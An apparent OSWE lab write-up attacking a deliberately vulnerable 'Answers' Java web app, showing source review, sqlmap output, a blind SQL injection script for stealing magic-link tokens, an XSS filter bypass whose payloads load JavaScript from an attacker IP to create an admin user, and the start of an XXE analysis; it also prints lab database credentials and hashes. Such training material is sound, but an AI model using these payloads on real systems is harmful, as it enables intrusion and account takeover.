# Answers Application
Answers Application is a Java Spring MVC-based web application that uses PostgreSQL as its database management system (DBMS) and runs on Linux. It allows unauthenticated users to ask questions, explore existing questions and their answers, add comments, and view other users’ profiles.

The application supports two types of privileges: **Moderator** and **Administrator**. 

## Application Discovery
To reduce the web application’s attack surface, we begin with the front end and review the HTTP handlers. In this Java application, handlers are easy to identify due to their consistent naming patterns, such as **`@GetMapping`** and **`@PostMapping`**. Other handlers—specifically those responsible for some administrative functionality—are defined using **`@RequestMapping`**.

To enumerate all available endpoints in the application, we can use the following regular expressions:

* `@(Get|Post)Mapping\("([^"]*)"\)` → captures the majority of application endpoints
* `@RequestMapping\(value="([^"]*)",\s*method=RequestMethod\.(GET|POST)\)` → captures some administrative endpoints

Since we are attacking the application as an unauthenticated user, **we will primarily use the first regex**. The second one is less relevant, as it targets administrative endpoints that are inaccessible to us.

### Authentication Bypass Round One — SQLI and XSS to Administrative Access 
#### SQLI Discovery
Further examination for application unauthenticated routes and searching for function the uses a user unsanitized input into SQL queries leads us to `/categories?order=name`, which is defined at `/src/main/java/com/offsec/awae/answers/MainController.java`:
```java
...
	@GetMapping("/categories")
	public String getCategoriesPage(HttpServletRequest req, Model model, HttpServletResponse res) {
		
		if(isAuthenticated(req)) {
			decorateModel(req, model);
		}

		getDecoratedTopFive(model);
		
		String sort = req.getParameter("order") != null ? req.getParameter("order") : "";
		
		List<DecoratedCategory> categories = catDao.getAllDecoratedCategoriesSorted(sort);
		model.addAttribute("categories", categories);
		
		return "categories";
	}
...
```
The `order` parameter is taken directly from the request (`req.getParameter("order")`) and passed into `catDao.getAllDecoratedCategoriesSorted(sort)` without validation or sanitization.

Let's press CTRL and click the function `getAllDecoratedCategoriesSorted()` to see its definition, the function is defined at `/src/main/java/com/offsec/awae/answers/dao/CategoryDao.java`:
```java
...
public List<DecoratedCategory> getAllDecoratedCategoriesSorted(String sort) {
		
		if(sort.equalsIgnoreCase("count")) 	
			sort = "count(q.id)";
		
		String sql = "SELECT c.id, c.name, count(q.id) as questionCount FROM categories c "
				+ " LEFT JOIN questions q ON c.id = q.category_id"
				+ " GROUP BY c.id, c.name ";
		
		if(!sort.equalsIgnoreCase("") ) {
			sql += " ORDER BY " + SqlUtil.escapeString(sort) +  " DESC ";
		}
		
		return template.query(sql, new DecoratedCategoryRowMapper());
				
	}
...
```
The `sort` value (user-controlled input) is **directly concatenated into the SQL string**:
```sql
...
sql += " ORDER BY " + SqlUtil.escapeString(sort) +  " DESC ";
...
```
Even though `SqlUtil.escapeString(sort)` sounds like it provides protection, string escaping is not sufficient for SQL identifiers (like column names or functions). Escaping usually protects string literals (`'foo'`), not raw SQL fragments.

Since sort ends up outside quotes, an attacker can still inject malicious SQL, e.g.:
```sql
order=id; DROP TABLE users --
```
→ This becomes:
```sql
ORDER BY id; DROP TABLE users -- DESC
```
which breaks the intended query and executes arbitrary SQL.

#### Triggering the SQLI
Now we know that we cannot use any quotes in our payloads, and since we are dealing with PostgreSQL, which allows stacked queries, let’s make a note of this before moving forward.

Lets use SQLMap:
```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -u http://answers/categories?order=name -p order --dbms=postgresql 
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.6#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
...
[*] starting @ 05:35:31 /2025-08-21/

[05:35:31] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: order (GET)
    Type: boolean-based blind
    Title: PostgreSQL boolean-based blind - Parameter replace
    Payload: order=(SELECT (CASE WHEN (2035=2035) THEN 2035 ELSE 1/(SELECT 0) END))

    Type: time-based blind
    Title: PostgreSQL > 8.1 time-based blind - Parameter replace
    Payload: order=(SELECT 5819 FROM PG_SLEEP(5))
---
[05:35:31] [INFO] testing PostgreSQL
[05:35:31] [INFO] confirming PostgreSQL
[05:35:31] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: PostgreSQL
[05:35:31] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/answers'                                                                       

[*] ending @ 05:35:31 /2025-08-21/

                                                                                            
┌──(kali㉿kali)-[~]
└─$
```
SQLMap has discovered a blind SQLI vulnerability and gave us the payloads we can use to trigger the SQLI.

SQLMap has identified two types of SQLI: `boolean-based blind` and `time-based blind`.

#### Familiarizing ourselves with the application back-end database structure
Let’s take a look into the application database, as this will make it easier to identify which tables store sensitive data to target.

Let's ssh to the Debug VM, and use the database login credentials at `/out/production/answers/main/resources/application.properties`:
```java
spring.mail.host=127.0.0.1
spring.mail.port=587
server.port=8888
logging.file.name=/var/log/answers.log
logging.level.root=ERROR

spring.datasource.platform=POSTGRESQL
spring.datasource.driver-class-name=org.postgresql.Driver

spring.datasource.url=jdbc:postgresql://127.0.0.1:5432/answers
spring.datasource.username=webapp
spring.datasource.password=7UxWFfLpsu4rJA94
```
After SSH to the Debug VM, let's login to the databse console via:
```bash
psql -h 127.0.0.1 -p 5432 -U webapp -d answers
Password for user webapp: 
```
After connecting to the database console, let's view the available tables:
```bash
answers=# \dt 
           List of relations
 Schema |    Name    | Type  |  Owner   
--------+------------+-------+----------
 public | answers    | table | postgres
 public | categories | table | postgres
 public | questions  | table | postgres
 public | tokens     | table | postgres
 public | users      | table | postgres
(5 rows)

answers=#
```
The tables `users` and `tokens` seem interesting, let's start with `users`:
```bash
answers=# select * from users;                                                                                                                                                                                                                              
 id | username  |           password            | isadmin | ismod |          email                                                                                                                                                                          
----+-----------+-------------------------------+---------+-------+-------------------------                                                                                                                                                                
  3 | Alice     | VsBALJ88OHAmorsvXeNQTcFca2M== | f       | f     | alice@answers.local                                                                                                                                                                     
  4 | Bob       | njEPfgDJ0CAxAH8yFnZVXVDTTRM=  | f       | f     | bob@answers.local                                                                                                                                                                       
  6 | Demetri   | KL9g4d6C5JynSctHgDPQoLliG9M=  | f       | f     | demetri@answers.local                                                                                                                                                                   
  8 | Franco    | 6P9OkSemHszcHlXQb+rTIa8KPV0=  | f       | f     | franco@answers.local                                                                                                                                                                    
  5 | Carl      | VFE/mi/SPbW13a4NyAhHoPyRZsI=  | f       | t     | carl@answers.local                                                                                                                                                                      
  7 | Evelyn    | vo0i+Wp1G2F1SiAGW5c57+94pjk=  | f       | t     | evelyn@answers.local                                                                                                                                                                    
  1 | admin     | oxloQ7JK1hmHw9FF8tai1n5TolY=  | t       | t     | admin@answers.local                                                                                                                                                                     
  2 | anonymous | oxloQ7JK1hmHw9FF8tai1n5TolY=  | f       | f     | anonymous@answers.local                                                                                                                                                                 
(8 rows)                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                            
answers=#
```
The `users` table stores hashed passwords of application users. We will note this and move forward.

Now let's examine the tbale `tokens`:
```bash
answers=# select * from tokens;                                                                                                                                                                                                                        
 user_id | token                                                                                                                                                                                                                                            
---------+-------                                                                                                                                                                                                                                           
(0 rows)                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                            
answers=#
```
It is an empty table, but based on the naming convention it seems to be holding password reset tokens or something similar.

Let's explore the application further.

##### Magiclinks
The application does not enable the unauthenticated user to create and account, only user with administrative privilage can do.

Examining the login page of the application at `http://answers/login`, since we do not have valid user credentials, we can input a known existing username (e.g., `Carl`) and any password then observe the application’s behavior.

The application prompts us a message saying:
```
Trouble logging in?

Complex password got you down? Get a magic link and sign in from your email!
You can still log in normally below.
```
The application allows a login method called **`Magiclink`**, it enables the user to login without using his password. It makes sense now why the `token` tables exists.

Let's click the button **`Send Magic Link`**, and then re-examine the `tokens` table:
```bash
answers=# select * from tokens;                                                                                                                                                                                                                             
 user_id |                          token                                                                                                                                                                                                                   
---------+----------------------------------------------------------                                                                                                                                                                                        
       5 | bGNDcFBybnNWVVM3aDZQSmFyLEo0L1FQcWJ8Q3Bmf3I0fUhMUlVRPVRk                                                                                                                                                                                         
(1 row)                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                            
answers=#
```
Now we know exactly what to target. A successful SQLi attack would allow us to exfiltrate the magic link token from the database, granting unauthorized access to the application.

this is how the request looks like:
```
POST /generateMagicLink HTTP/1.1
Host: 192.168.174.235:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

username=Carl
```
To reach where the function responsible for generating the magic link token in the application source code, we will search with `@PostMapping("/generateMagicLink")`, and this leads us to:
```java
...
	@PostMapping("/generateMagicLink")
	public String postGenerateMagicLink(HttpServletRequest req, Model model, HttpServletResponse res) {
		
		if(req.getParameter("username") != null) {
			User u = userDao.getUserByName((String) req.getParameter("username"));
			
			// don't allow magic links for admin
			if(!u.getUsername().equalsIgnoreCase("admin")) {
				
				logger.info("Generating magic link for " + u.getUsername());
				
				String magic = TokenUtil.createToken(u.getId());
								
				userDao.insertTokenForUser(magic, u.getId());
				
				// TODO email the token
				emailMagicLink(u.getEmail(), magic);
				
				model.addAttribute("message", "Magic link sent! Please check your email.");
				model.addAttribute("username", u.getUsername());
				return "redirect:/login";
			} else {
				return "redirect:/login";
			}
		} else {
			// no username, just redirect to login page.
			return "redirect:/login";
		}
		
		
	}
...
```
It is very important to notice that the application does not allow magic links for `admin`:
```java
...
// don't allow magic links for admin
			if(!u.getUsername().equalsIgnoreCase("admin")) {
...
```
This means that even if we could exfiltrate a valid magic link token using the SQLi discovered earlier, it would not grant administrative access to the application. We cannot generate a magic link token for the `admin`, and the other users are only moderators (lower-privileged accounts).

#### Exploiting the SQLI
We will not make use of time-based blind SQL injection, as exfiltrating data from the database using this technique may cause the web application to crash if a large sleep time (e.g., `sleep(15)`) is set. Moreover, exfiltrating data using time-based SQLi is not a reliable method.

Taking black-box approach to enumerate the token length, a SQLi payload that does this would look like:
```
GET /categories?order=(SELECT+CASE+WHEN+(SELECT+LENGTH(token)+FROM+tokens+WHERE+user_id=5+LIMIT+1)=56+THEN+(1)+ELSE+1/(SELECT+0)+END)
```
As we have access to the databse, we know that the token lenght is `56`, so sending this SQLi payload will make the server respond with `200 OK`.

But if we pass a wrong token length like `55`, the server would respond with `500 Internal Server Error`.

Now that we know how a successful injection would look like (`200 OK`), lets build a Python script that gives us the token length:
```python
length = 0
    while True:
        TknLenPayload = f"(SELECT CASE WHEN (SELECT LENGTH(token) FROM tokens WHERE user_id=5 LIMIT 1)={length} THEN (1) ELSE 1/(SELECT 0) END)"
        length = length +1 
        TknLenUrl = urljoin(target, f"/categories?order={TknLenPayload}")
        try:
            TknLenghtRes = requests.get(TknLenUrl)
            if TknLenghtRes.status_code == 200:
                print(f"[+] Magiclink token length: {length}")
                break
        except Exception as e:
            print("[-] Error exfiltrating the token length: ", e)
            traceback.print_exc()
```
Now that we know how to exfiltrate the token length, let's proceed with the token exfiltration.

A SQLi payload that exfiltrates the magic link token character by character looks like:
```
GET /categories?order=(SELECT CASE WHEN (SELECT (ASCII(SUBSTRING(token,1,1))) FROM tokens WHERE user_id=5 LIMIT 1)=99 THEN (1) ELSE 1/(SELECT 0) END)
```
A successful guess would make the server respond with `200 OK`, otherwise `500 Internal Server Error`.

Now we have the neccessary information that help us writing our Python script that will allow us exfiltrating the magic link token.

**Exfiltrate magic link token script:** [sqli_exfl_MgkLnkTkn.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/6feb55feed95dedc4906e72b5a5306d8b6451fba/ExtraMile/Answers%20Application/sqli_exfl_MgkLnkTkn.py) 

*Reminder: exfiltrating the magic link token method does not give us access to the user `admin` on target application, cause we cannot generate a magic link token for the user`admin`*

At this point, we need to figure out a way to create a user that has administrative privilege on the traget machine, and then use our discovered SQLi to exfiltrate its magic link token to gain administrative access to the target machine.

#### XSS Discovery
By exploring the application as unauthenticated user, we could observe that an unauthenticated user can can ask a question at `http://answers/question`, the request looks like this:
```
POST /question HTTP/1.1
Host: answers
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

title=Question&description=This+is+a+question&category=1
```
When we vistit the page `http://answers/question`, we can clearly see a message that says:
```
Anonymous users can ask questions, but the contents will be review by a moderator before they are published. Please don't abuse this. :)

Please fill out all required fields.

```
This means that if we could deliver a successfull XSS attack, we might be able to execute arbitrary JavaSctipt in the admin's browser.

Unfortunately, a message saying `Allowed HTML elements are <em>, <strong>, and <code>` is in the same page.

Let's try to inject other HTML elements like `<script>` to see examine the server behaviour, let's inject an XSS payload `<script>$.getScript("//xss.report/c/solimaan")</script>`.

The server responded with `200 OK` with no error messages appeared in the web page, but seems like the XSS did not work as we did not recieve any request to our server.
##### XSS Filter Evasion 
Let's view the code snippet responsibe for this function at `/src/main/java/com/offsec/awae/answers/MainController.java`:
```java
	@PostMapping("/question")
	public String postQuestion(HttpServletRequest req, Model model, HttpServletResponse res) {
		// <!--  title, description, owner_id, category_id, created, needs_mod, active -->
		String title = req.getParameter("title") != null ? req.getParameter("title") : "";
		String description = req.getParameter("description") != null ? req.getParameter("description") : "";
		String username = isAuthenticated(req) ? (String) req.getSession(false).getAttribute("username") : "anonymous";
		
		int categoryId;
		try {
			categoryId = Integer.parseInt(req.getParameter("category"));
		} catch (Exception e) {
			categoryId = 0;
		}
		boolean needsMod = !isAuthenticated(req);
		boolean isActive = true;
		int ownerId = userDao.getUserByName(username).getId();
		
		if(title.equalsIgnoreCase("") || description.equalsIgnoreCase("") || categoryId == 0 ) {
			model.addAttribute("message", "Please fill out all required fields.");
			decorateModel(req, model);
			getDecoratedCategories(model);
			return "question";
		} else {
			description = SqlUtil.escapeString(description);
			description = StringUtil.cleanText(description);
			logger.info("Creating new question");
			questionDao.insertQuestion(title, description, ownerId, categoryId, needsMod, isActive);
		}
		model.addAttribute("message", "Question submitted!");
		return "question";
		
	}
```
It seems like the method `StringUtil.cleanText(description)` is the one responsibe for elements validation, so let's pres CTRL and click the function name so it takes us to the function definition.

It toke us to `/src/main/java/com/offsec/awae/answers/util/StringUtil.java`:
```java
package com.offsec.awae.answers.util;
public class StringUtil {
	private static final String[] ALLOWED_TAGS = { "em>", "strong>", "code>" };
	public static String cleanText(String input) {
		StringBuilder sb = new StringBuilder();
		boolean allowed = false;
		String tmp;
		for(String token : input.split(" ")) {
			if(token.startsWith("<")) {
				allowed = false;
				if(!token.endsWith(">")) {
					tmp = token.split(">")[0];
					tmp += ">";
					for(String tag : ALLOWED_TAGS) {
						if(tmp.endsWith(tag)) {
							allowed = true;
							break;
						}
					}
				} else {
					for(String tag : ALLOWED_TAGS) {
						if(token.endsWith(tag)) {
							allowed = true;
							break;
						}
					}
				}
				if(allowed) {
					sb.append(token).append(" ");
				} 
			} else {
				sb.append(token).append(" ");
			}
		}
		return sb.toString().trim();
	}
}
```
`cleanText()` only checks if a token (split by spaces) ends with one of the allowed strings (`em>`, `strong>`, `code>`). If it does, it keeps the whole token — without verifying what came before it.

So a payload looks like this can bypass the filter:
```
a<script src=http://192.168.45.243/xssWorked></script>em>
```
So, let's verify that by openning a Python server on port 80 and then inject our payload in the *Description* field to see what happens:
```bash
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.174.234 - - [21/Aug/2025 20:25:05] code 404, message File not found
192.168.174.234 - - [21/Aug/2025 20:25:05] "GET /xssWorked HTTP/1.1" 404 -

```
Excellent, we verified our XSS payload is indeed working and the filter was successfully bypassed.

#### XSS Exploitation
Knowing that we have the ability to execute arbitrary JavaScript in the context of the admin's browser, and after further exploration of the target application, we came across the endpoint `/admin/users/create`, which allows the admin to create a user and specify whether the user has administrator privileges, among other options.
```java
	@PostMapping("/admin/users/create") 
	public String postUserCreate(HttpServletRequest req, Model model, HttpServletResponse res) {
		if(!isAdmin(req) ) {
			model.addAttribute("message", "You must be logged in to access this area.");
			return "redirect:/login";
		} 
		
		SessionUtil.decorateModel(req, model);
		
		String username = req.getParameter("name") != null ? req.getParameter("name") : "";
		String email = req.getParameter("email") != null ? req.getParameter("email") : "";
		boolean isAdmin = req.getParameter("isAdmin") != null ? Boolean.parseBoolean(req.getParameter("isAdmin")) : false;
		boolean isMod = req.getParameter("isMod") != null ? Boolean.parseBoolean(req.getParameter("isMod")) : false;

		if(username.equalsIgnoreCase("") || email.equalsIgnoreCase("")) {
			model.addAttribute("message", "Missing required fields.");
			return "redirect:/admin/users";
		} else {
			String password = Password.generatePassword(16);
			logger.info("AdminController.postUserCreate() - Creating new user");
			try {
				String hashedPassword = Password.hashPassword(password);
				userDao.insertUser(username, hashedPassword, isAdmin, isMod, email);
				emailNewUser(email, username, password);
				password = "";
			} catch (Exception e) {
				logger.error("[!] Exception occurred while try to add a new user: " + e.getMessage());
			}
		}
		
		
		List<User> users = userDao.getAllUsers();
		model.addAttribute("users", users);
		
		return "users";
	}
	
```
This code snippet is from `/src/main/java/com/offsec/awae/answers/AdminController.java`

Exploiting the XSS discovered earlier, we can make the admin's browser create a new use with administrative privilages.

Host the `crAdmin.js` on our python server:
```javascript
var http = new XMLHttpRequest();
var url = '/admin/users/create';
var params = 'name=randomusername&email=newadmin@user.ltd&isAdmin=true&isMod=true';
http.open('POST', url, true);
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
http.send(params);
```
Trigger the XSS:
```
a<script src=http://192.168.45.243/crAdmin.js></script>em>
```
*Note: Stop the server immediately after receiving the first request from the target application, as it will continuously request the malicious JavaScipt on your server and execute it (create new users with the same username), which will cause the process of exfiltrating the magiclink token to fail.*

We can verify that the XSS attack worked successfully and our new admin user has indeed been created by visiting `http://answers/profile/9`.

#### Gaining Administrative Access to the Target Web Application
Chaining the discovered XSS with the SQLi to create a user with administrative access on the target web application the exfiltrate its magic link token will give us acceess to administrative user account on the web application.

**A Python script was written to automate this process:** [xss_crt_adm_sqli_steal_tkn.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/6feb55feed95dedc4906e72b5a5306d8b6451fba/ExtraMile/Answers%20Application/xss_crt_adm_sqli_steal_tkn.py) 

Output:
```bash
┌──(kali㉿kali)-[~]
└─$ python3 xss_crt_adm_sqli_steal_tkn.py http://answers 192.168.45.243
[*] Delivering the XSS attack...
[*] Serving on port 80, waiting for /crAdmin.js ...
[+] XSS attack delivered successfully. Waiting for admin...
192.168.174.234 - - [22/Aug/2025 13:55:05] "GET /crAdmin.js HTTP/1.1" 200 -
[*] Server stopped.
[+] XSS Attack Succeeded
[+] Magicklink requested for user randomusername
[+] Magiclink token length: 57
OyFJKDx_bnxdOXlPay9XSzs7R09HXWRtcDhrWiNES2Vke19lfy1aLVhE
[+] Magiclink Token exfiltrated:  OyFJKDx_bnxdOXlPay9XSzs7R09HXWRtcDhrWiNES2Vke19lfy1aLVhE
                                                                                                                                                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ 
```

Now let's use the token exfiltrated to authenticate ourselves as an administrative user:
```
http://answers/magicLink/OyFJKDx_bnxdOXlPay9XSzs7R09HXWRtcDhrWiNES2Vke19lfy1aLVhE
```

Reponse:
```
HTTP/1.1 302 
...
Location: http://192.168.174.234/
Content-Length: 0
Set-Cookie: JSESSIONID=554F8318282693B677AE059C0A14729D; Path=/; HttpOnly
...

```
### Authentication Bypass Round Two — XSS and Insecure Random Number Generator `java.util.Random`
Analyzing the code snippet responsible for the magic link token generation:
```java
	@PostMapping("/generateMagicLink")
	public String postGenerateMagicLink(HttpServletRequest req, Model model, HttpServletResponse res) {
		
		if(req.getParameter("username") != null) {
			User u = userDao.getUserByName((String) req.getParameter("username"));
			
			// don't allow magic links for admin
			if(!u.getUsername().equalsIgnoreCase("admin")) {
				
				logger.info("Generating magic link for " + u.getUsername());
				
				String magic = TokenUtil.createToken(u.getId());
								
				userDao.insertTokenForUser(magic, u.getId());
				
				// TODO email the token
				emailMagicLink(u.getEmail(), magic);
				
				model.addAttribute("message", "Magic link sent! Please check your email.");
				model.addAttribute("username", u.getUsername());
				return "redirect:/login";
			} else {
				return "redirect:/login";
			}
		} else {
			// no username, just redirect to login page.
			return "redirect:/login";
		}
		
		
	}
```
#### When Random Isn't 
The method `createToken` is the one responsible for generating the magic link token, let's follow the function definition:
```java
package com.offsec.awae.answers.util;

import java.util.Base64;
import java.util.Random;

public class TokenUtil {

	public static final String CHAR_LOWER = "abcdefghijklmnopqrstuvwxyz";
	public static final String NUMBERS = "1234567890";
	public static final String SYMBOLS = "!@#$%^&*()";
	public static final String CHARSET = CHAR_LOWER + CHAR_LOWER.toUpperCase() + NUMBERS + SYMBOLS;
	
	public static final int TOKEN_LENGTH = 42;
	
	public static String createToken(int userId) {
		Random random = new Random(System.currentTimeMillis());
		StringBuilder sb = new StringBuilder();
		byte[] encbytes = new byte[TOKEN_LENGTH];
		
		for(int i = 0; i < TOKEN_LENGTH; i++) {
			sb.append(CHARSET.charAt(random.nextInt(CHARSET.length())));
		}
		
		
		byte[] bytes = sb.toString().getBytes();
		
		for(int i=0; i<bytes.length; i++) {
			encbytes[i] = (byte) (bytes[i] ^ (byte) userId);
		}
		
		return Base64.getUrlEncoder().withoutPadding().encodeToString(encbytes);
	}

}

```
The application is using `new Random(System.currentTimeMillis())` to generate the `random` value which is an insecure way, as the `java.util.Random` is known as an insecure random number generator, means that an attacker can guess the random value generated using the `java.util.Random`

After creating ourselves a user with administrative privileges on the target application [using the XSS discussed earlier](https://github.com/0xNayel/OSWE-AWAE-Notes/tree/main/ExtraMile/Answers%20Application#xss-exploitation), now let's brute force the newly created user magic link token.

**Token generator:** [TokenUtil.java](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/ExtraMile/Answers%20Application/TokenUtil.java) 

**Token Spray:** [weakRandomNumberGeneratorAuthBypass.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/ExtraMile/Answers%20Application/weakRandomNumberGeneratorAuthBypass.py) 

### RCE — XXE and PostgreSQL `COPY` function to execute system level commands 
Now that we have administrative access on the target application, let's find our way to the RCE by exploring the admin functionalities.

One of the functions that caught our attention is `Data Query` located at `http://answers/admin/query` as it allows the admin to execute SQL queries, so let's try to execute a simple SQL query `SELECT version();`

The server responded with **`Missing or invalid key. Contact the system admin.`**, so how do we get the `adminKey`?

Let's search in the code for `@RequestMapping(value="/admin/query", method=RequestMethod.POST)` so we can see how the endpoint functions:
```java
...
	@RequestMapping(value="/admin/query", method=RequestMethod.POST)
	public String postQuery(HttpServletRequest req, Model model, HttpServletResponse res) {
		if(!isAdmin(req) ) {
			model.addAttribute("message", "You must be logged in to access this area.");
			return "redirect:/login";
		} 
		
		String inKey = req.getParameter("adminKey") != null ? req.getParameter("adminKey") : "";
		
		if(checkKey(inKey) == false) {
			model.addAttribute("message", "Missing or invalid key. Contact the system admin.");
			return "query";
		}
		
		try {
			String query = req.getParameter("query") != null ? req.getParameter("query") : "";
			
			if(!query.equals("")) {
				List<Map<String,Object>> results = adminDao.runQuery(query);
				
				if(results.size() > 0) {
				
					StringBuilder sb = new StringBuilder();
					// add headers
					for (String key : results.get(0).keySet()) {
						sb.append(key).append(" | ");
					}
					sb.append("\n");
					// then process rows
					for(Map<String, Object> row : results) {
						for (String key : row.keySet()) {
							sb.append(row.get(key)).append(" | ");
						}
						sb.append("\n");
					}
					
					model.addAttribute("results",sb.toString());
				} else {
					model.addAttribute("message", "Zero results returned.");
				}
				
			} else {
				model.addAttribute("message", "Please provide a query.");
			}
			
		} catch (Exception e) {
			logger.error("[!] Exception occurred in AdminController.postQuery" + e.getMessage());
			model.addAttribute("message", "An error occurred: " + e.getMessage());
		}
		
		return "query";
	}
...
```
This code snippet located at `/src/main/java/com/offsec/awae/answers/AdminController.java`

This code snippet firstly checks if the user is an admin (`isAdmin(req)`), then validates the provided `adminKey` (`checkKey(inKey)`), rejecting the request if missing or invalid.

If the two conditions passed, it checks if a `query` parameter is given, it passes it directly to `adminDao.runQuery(query)`. 

*Note: The SQLi discovered earlier in the parameter `order` that gave us the authentication bypass won't help us to execute system level commands, as it is being executed with `template.query` not `adminDao.runQuery(query)` and executing system level commands in PGSQL requires higher privileges*

Now let's examine how the application validates the provided `adminKey` using the `checkKey(inKey)` by holding the CTRL button and clicking the function name:
```java
...
	/**
	 * This method checks if the provided value matches the server side admin key value
	 * @param inKey the provided key to validate
	 * @return if the values match 
	 */
	private boolean checkKey(String inKey) {
		if(adminKey == null) {
			try {
				File keyFile = new File("/home/student/adminkey.txt");
				if (keyFile.exists()) {
					// if the keyFile exists, read it in and update the local key value
					FileReader fr = new FileReader(keyFile);
					BufferedReader br = new BufferedReader(fr);
					adminKey = br.readLine().trim();
					br.close();
					
				} else {
					// if the key file doesn't exist, generate a key and write it to the file
					keyFile.createNewFile();
					FileWriter fw = new FileWriter(keyFile,true);
					UUID uuid = UUID.randomUUID();
					adminKey = uuid.toString();
					fw.write(adminKey);
					fw.close();
					
				}
			} catch(Exception e) {
				logger.error("[!] Exception occurred accessing admin key file - " + e.getLocalizedMessage() );
				return false;
			}
		} 
		
		return adminKey.equals(inKey);
	}
...
```
This code snippet is from `/src/main/java/com/offsec/awae/answers/AdminController.java`.

This method `checkKey` **validates an admin key** by comparing the provided key (`inKey`) with a server-side key. If the server key isn’t already loaded, it reads it from `/home/student/adminkey.txt` (or generates and saves one if missing). Then it returns whether the keys match.

Now that we know we cannot execute a SQL query without providing a valid `adminKey`, we need to find a way to achieve arbitrary local system file read to read the file containing the `adminKey` (`/home/student/adminkey.txt`).

#### XXE — Arbitrary File Read 
Further explotation of the target application leads us an intersting functionality called **`Data Import`** located at `http://answers/admin/import` which accepts XML user input, let's search the search code for `@RequestMapping(value="/admin/import", method=RequestMethod.POST)`:
```java
...
	@RequestMapping(value="/admin/import", method=RequestMethod.POST)
	@ResponseBody
	public String postImport(HttpServletRequest req, Model model, HttpServletResponse res) {
		
		if(!isAdmin(req) ) {
			model.addAttribute("message", "You must be logged in to access this area.");
			return "redirect:/login";
		}
		
		
		boolean isPreview = req.getParameter("preview") != null ? Boolean.parseBoolean(req.getParameter("preview")) : true;
		
		try {
			// read in the XML
			DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
			DocumentBuilder builder = factory.newDocumentBuilder();
			
			logger.warn("AdminController.postImport() - processing XML data. "); 
			
			String xmlData = req.getParameter("xmldata") != null ? req.getParameter("xmldata") : "";
			// build a document from it
			Document document = builder.parse(new ByteArrayInputStream(xmlData.getBytes("utf-8")));
			
			StringBuilder sb = new StringBuilder();
			int recordCount=0;
			// if we're not in preview mode, then step through it and process it
			if(!isPreview) {
				
				Node root = document.getDocumentElement();
				Node n;
				if(root.getNodeName().equalsIgnoreCase("database")) {
					NodeList children = root.getChildNodes();
					
					for(int i = 0; i<children.getLength();i++) {
						n = children.item(i);
						switch(n.getNodeName().toLowerCase()) {
						case "categories":
							NodeList cats = document.getElementsByTagName("category");
							catDao.truncateTable();
							sb.append("Truncated category table");
							recordCount = 0;
							for(int j = 0; j < cats.getLength(); j++) {
								NodeList catChildren = cats.item(j).getChildNodes();
								for(int k= 0; k< catChildren.getLength(); k++) {
									if(catChildren.item(k).getNodeName().equalsIgnoreCase("name")) {
										catDao.addCategory(catChildren.item(k).getNodeValue());
										recordCount++;
									}
								}
							}
							sb.append("inserted " + recordCount + " rows");
							break;
						case "users":
							NodeList users = document.getElementsByTagName("user");
							userDao.truncateTable();
							sb.append("Truncated users table");
							recordCount = 0;
							for(int j = 0; j < users.getLength(); j++) {
								NodeList userChildren = users.item(j).getChildNodes();
								String val;
								User u = new User();
								for(int k= 0; k< userChildren.getLength(); k++) {
									val = userChildren.item(k).getTextContent();
									
									switch(userChildren.item(k).getNodeName()) {
									case "id":
										break;
									case "username":
										u.setUsername(val);
										break;
									case "password":
										u.setPassword(val);
										break;
									case "isAdmin":
										u.setAdmin(Boolean.parseBoolean(val));
										break;
									case "isMod":
										u.setMod(Boolean.parseBoolean(val));
										break;
									case "email":
										u.setPassword(val);
										break;
									}
								}
								userDao.insertUser(u.getUsername(), u.getPassword(), u.isAdmin(), u.isMod(), u.getEmail());
								recordCount++;
								u = null;
							}
							sb.append("inserted " + recordCount + " rows");
							break;
						case "questions":
							NodeList questions = document.getElementsByTagName("question");
							questionDao.truncateTable();
							sb.append("Truncated questions table");
							recordCount = 0;
							HashMap<String, String> qMap;
							Question q;
							for(int j = 0; j < questions.getLength(); j++) {
								q = new Question();
								NodeList qChildren = questions.item(j).getChildNodes();
	
								qMap = getMapFromNodeList(qChildren);
										
								q.setTitle(qMap.get("title"));
								q.setDescription(qMap.get("description").replace("<![CDATA[", "").replace("]]>",""));
								q.setOwnerId(Integer.parseInt(qMap.get("ownerId")));
								q.setCategoryId(Integer.parseInt(qMap.get("categoryId")));
								q.setCreated(Date.valueOf(qMap.get("created")));
								q.setNeedsMod(Boolean.parseBoolean(qMap.get("needsMod")));
								q.setActive(Boolean.parseBoolean(qMap.get("isActive")));
								
								questionDao.insertQuestion(q);
								recordCount++;
							}
							sb.append("inserted " + recordCount + " rows");
							
							break;
						case "answers":
							NodeList answers = document.getElementsByTagName("answer");
							answerDao.truncateTable();
							sb.append("Truncated questions table");
							recordCount = 0;
							HashMap<String, String> map;
							Answer a;
							for(int j = 0; j < answers.getLength(); j++) {
								map = getMapFromNodeList(answers.item(j).getChildNodes());
								a = new Answer();
								a.setCreated(Date.valueOf(map.get("created")));
								a.setDescription(map.get("description").replace("<![CDATA[", "").replace("]]>", ""));
								a.setOwner_id(Integer.parseInt(map.get("ownerId")));
								a.setQuestion_id(Integer.parseInt(map.get("questionId")));
								
								answerDao.insertAnswer(a);
								recordCount++;
							}
							sb.append("inserted " + recordCount + " rows");
							break;
						}
					}
					
					return sb.toString();
				} else {
					logger.debug("[!] Unexpected XML document in AdminController.postImport");
					return "Unexpected XML document";
				}
			} else {
